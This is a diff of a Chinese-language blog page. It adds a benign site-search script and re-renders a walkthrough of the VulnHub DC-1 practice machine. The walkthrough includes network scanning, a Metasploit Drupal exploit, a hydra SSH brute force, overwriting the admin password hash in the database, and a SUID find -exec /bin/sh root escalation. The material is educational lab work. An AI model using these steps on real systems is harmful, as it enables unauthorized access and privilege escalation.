@@ -248,9 +248,41 @@
       
 
       
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
     </ul>
   
 
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
   
 </nav>
 
@@ -394,7 +426,7 @@
       
 
       
-        <h1 id="DC-1过程总结"><a href="#DC-1过程总结" class="headerlink" title="DC-1过程总结"></a>DC-1过程总结</h1><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查找目标ip：     arp-<span class="built_in">scan</span> -l</span><br><span class="line">全端口扫描：   nmap -sV -p- <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span></span><br><span class="line">查找框架漏洞： msfconsose -&gt; search Drupal -&gt;use 漏洞名称</span><br><span class="line">   （drupal中的配置文件默认在 sites/defult/settings.php）</span><br><span class="line">用户数据库：   cat /etc/passwd</span><br><span class="line">用户密码使用hydra+john the ripper爆破: hydra -l flag4 -P /root/john<span class="number">-1.8</span><span class="number">.0</span>/run/password.lst ssh:<span class="comment">//192.168.128.139</span></span><br><span class="line">ssh远程连接：  ssh flag4@<span class="number">192.168</span><span class="number">.128</span><span class="number">.139</span></span><br><span class="line">mysql登陆：   mysql -u dbuser -p  -&gt;输入数据库密码</span><br><span class="line">数据库： <span class="built_in">show</span> databases;</span><br><span class="line">        use drupaldb;</span><br><span class="line">        <span class="built_in">show</span> <span class="built_in">tables</span>;</span><br><span class="line">        <span class="keyword">select</span> * <span class="keyword">from</span> users;</span><br><span class="line">    (Drupal密码重置)<span class="keyword">update</span> users <span class="built_in">set</span> pass='$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9<span class="number">.8</span>M/D9okW7J/s5U4' <span class="built_in">where</span> uid=<span class="number">1</span>;</span><br><span class="line">SUID提权：    find / -<span class="built_in">type</span> f -perm -u=s <span class="number">2</span>&gt;/<span class="built_in">dev</span>/<span class="built_in">null</span></span><br></pre></td></tr></table></figure>
+        <h1 id="DC-1过程总结"><a href="#DC-1过程总结" class="headerlink" title="DC-1过程总结"></a>DC-1过程总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查找目标ip：     arp-scan -l</span><br><span class="line">全端口扫描：   nmap -sV -p- 192.168.75.134</span><br><span class="line">查找框架漏洞： msfconsose -&gt; search Drupal -&gt;use 漏洞名称</span><br><span class="line">   （drupal中的配置文件默认在 sites/defult/settings.php）</span><br><span class="line">用户数据库：   cat /etc/passwd</span><br><span class="line">用户密码使用hydra+john the ripper爆破: hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.128.139</span><br><span class="line">ssh远程连接：  ssh flag4@192.168.128.139</span><br><span class="line">mysql登陆：   mysql -u dbuser -p  -&gt;输入数据库密码</span><br><span class="line">数据库： show databases;</span><br><span class="line">        use drupaldb;</span><br><span class="line">        show tables;</span><br><span class="line">        select * from users;</span><br><span class="line">    (Drupal密码重置)update users set pass=&apos;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&apos; where uid=1;</span><br><span class="line">SUID提权：    find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
 <h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p>靶机下载地址：<br><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-1,292/</a><br>下载后用vm打开,打开的时候默认的是桥接模式,因我的kali使用的是NAT，所以DC-1需要改成NAT<br><img src="https://i.loli.net/2019/10/14/ZVQL9K5jBEbFCmy.png" alt="_9QEXS81US___U__3~LN9FE.png"></p>
 <h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p><img src="https://i.loli.net/2019/10/14/8g2twL4Szhy7o6e.png" alt="4_Y3ME6S`TE2EOFWH_0QP7O.png"></p>
@@ -430,19 +462,19 @@
 </blockquote>
 <p>database无果，尝试tables可看到users<br><img src="https://i.loli.net/2019/10/14/YBoVDJk5KGCWstx.png" alt="SLG~UN6AL_BQOGN@_U47036.png"></p>
 <p><img src="https://i.loli.net/2019/10/14/gN4USrIVJ2WbPDX.png" alt="~5_P_HPYCZ5_M__@DR4~8I2.png"><br>得到admin的账号和密码，但是密码已经加密，重置drupal的密码，把管理员的密码字段改成  </p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$S</span><span class="variable">$CDbdwZvjHQ09IVRs88G0fnaxPr50</span><span class="regexp">/kb81YI9.8M/</span>D9okW7J<span class="regexp">/s5U4</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/14/xaUEl9KefM18HiP.png" alt="S__RJ_V9I6_2LXPV3__M7LD.png"></p>
 <p>利用admin-password在网页进行登陆，浏览一下，即可发现flag3<br><img src="https://i.loli.net/2019/10/14/adJXBGhlunfiFjw.png" alt="UEC_8`NZ_26UOYYMQAQE_MF.png"><br><img src="https://i.loli.net/2019/10/14/4FmtCboAPnUjf8i.png" alt="S1MQF_665HFRX_~PI65KR_J.png"></p>
 <h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>suid提权：可以让调用者以文件拥有者的身份运行该文件。<br>使用命令</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -type f -perm <span class="attribute">-u</span>=s 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/14/hXKulnJAjt8mq91.png" alt="68S@SCS_BE_AW@WPW2152V8.png"><br>可运行的所有SUID可执行文件</p>
 <blockquote>
 <p>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb {} ;</p>
 </blockquote>
 <p>随便找一个命令进行利用，就找find，发现其确实是root用户权限的SUID的文件</p>
-<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~$ touch getflag  <span class="comment">//创建一个文件</span></span><br><span class="line">~$ <span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"whoami"</span> \;  <span class="comment">//通过find..exec 查找文件后并执行命令</span></span><br><span class="line">root</span><br><span class="line">~$ <span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~$ touch getflag  //创建一个文件</span><br><span class="line">~$ find / -type f -name getflag -exec &quot;whoami&quot; \;  //通过find..exec 查找文件后并执行命令</span><br><span class="line">root</span><br><span class="line">~$ find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/14/XgsUQMR9Llh8JAz.png" alt="0VCSD8~6C_W_2__WDR8T_OY.png"></p>
 <p>成功提权。</p>
@@ -855,6 +887,323 @@
 
 
   
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
 
 
 
